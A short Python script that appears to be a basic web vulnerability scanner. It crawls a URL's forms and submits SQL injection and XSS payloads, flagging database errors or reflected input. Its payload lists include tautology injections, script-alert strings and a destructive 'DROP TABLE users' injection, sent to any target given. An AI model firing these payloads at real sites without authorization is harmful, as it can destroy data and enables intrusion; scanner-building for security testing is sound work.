import requests
from bs4 import BeautifulSoup
import argparse

# SQL Injection payloads and error signatures
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"\" = \"",
    "'; DROP TABLE users; --"
]

sql_errors = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated"
]

# XSS Payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]

def get_all_forms(url):
    """Extract all forms from the given URL."""
    soup = BeautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extract method, action, and inputs from a form."""
    details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, base_url, payload):
    """Submit the form with the given payload and return response."""
    target_url = base_url + form_details["action"]
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text":
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10)
        else:
            return requests.get(target_url, params=data, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def is_sqli_vulnerable(response_text):
    """Check if response contains SQL error message."""
    for error in sql_errors:
        if error.lower() in response_text.lower():
            return True
    return False

def scan_vulnerabilities(url, scan_sqli=True, scan_xss=True):
    """Main scanner function based on selected flags."""
    print(f"\n[+] Scanning {url}...")
    forms = get_all_forms(url)
    print(f"[+] Found {len(forms)} form(s).\n")

    for i, form in enumerate(forms, start=1):
        print(f"[Form #{i}] Checking for vulnerabilities...")
        form_details = get_form_details(form)

        if scan_sqli:
            for payload in sql_payloads:
                response = submit_form(form_details, url, payload)
                if response and is_sqli_vulnerable(response.text):
                    print(f"[!!] SQL Injection vulnerability in form #{i} with payload: {payload}")
                    break
            else:
                print(f"[-] No SQLi vulnerability in form #{i}")

        if scan_xss:
            for payload in xss_payloads:
                response = submit_form(form_details, url, payload)
                if response and payload in response.text:
                    print(f"[!!] XSS vulnerability in form #{i} with payload: {payload}")
                    break
            else:
                print(f"[-] No XSS vulnerability in form #{i}")

        print("-" * 50)

def main():
    parser = argparse.ArgumentParser(description="Web Application Vulnerability Scanner (SQLi + XSS)")
    parser.add_argument("url", help="Target URL to scan (e.g., http://example.com)")
    parser.add_argument("--sqli", action="store_true", help="Enable SQL Injection scanning")
    parser.add_argument("--xss", action="store_true", help="Enable XSS scanning")

    args = parser.parse_args()

    # If no flags are set, scan both
    scan_sqli = args.sqli or not args.xss
    scan_xss = args.xss or not args.sqli

    scan_vulnerabilities(args.url, scan_sqli=scan_sqli, scan_xss=scan_xss)

if __name__ == "__main__":
    main()
